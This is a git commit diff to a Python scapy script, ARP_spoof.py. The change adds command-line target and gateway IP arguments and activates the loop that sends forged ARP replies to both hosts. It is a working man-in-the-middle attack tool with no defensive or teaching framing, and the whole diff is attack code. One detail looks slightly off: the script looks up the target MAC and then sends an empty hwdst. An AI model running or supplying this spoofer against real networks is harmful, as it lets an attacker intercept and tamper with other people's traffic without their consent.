b8f6171a733853ae64068a8d6e6afcfb1b4ca7da
El-Gendi <bodyelgendi3993@gmail.com>
2025-01-21 16:51:31 -0500

    Added arguments and commandline controls.

--- ARP_spoof.py
+++ ARP_spoof.py
@@ -2,6 +2,13 @@
 
 import scapy.all as scapy
 import time
+import argparse
+
+def get_arguments():
+    parser = argparse.ArgumentParser()
+    parser.add_argument("-tip", "--target", required=True, help="Target IP")
+    parser.add_argument("-gip", "--gateway", required=True, help="Gateway IP")
+    return parser.parse_args()
 
 def mac_scan(ip):
         arp_request = scapy.ARP(pdst=ip)
@@ -11,7 +18,7 @@ def mac_scan(ip):
         return answered_list[0][1].hwsrc
 
 def spoof(target_ip, spoof_ip):
-	target_mac = get_mac(target_ip)
+	target_mac = mac_scan(target_ip)
 	packet = scapy.ARP(op=2, pdst=target_ip, hwdst="", psrc=spoof_ip)
 	scapy.send(packet, verbose=False)
 
@@ -21,15 +28,14 @@ def restore(dest_ip, src_ip):
 	packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=src_ip, hwsrc=src_mac)
 	scapy.send(packet, count=4, verbose=False)
 
-target_ip =
-gateway_ip =
-
-
+args = get_arguments()
+target_ip = args.target
+gateway_ip = args.gateway
 sent_packets_count = 0
 try:
 	while True:
-#		spoof(target_ip, gateway_ip)
-#		spoof(gateway_ip, target_ip)
+		spoof(target_ip, gateway_ip)
+		spoof(gateway_ip, target_ip)
 		sent_packets_count = sent_packets_count + 2
 		print("\r[+] Total packets sent: " + str(sent_packets_count), end="")
 		time.sleep(2)
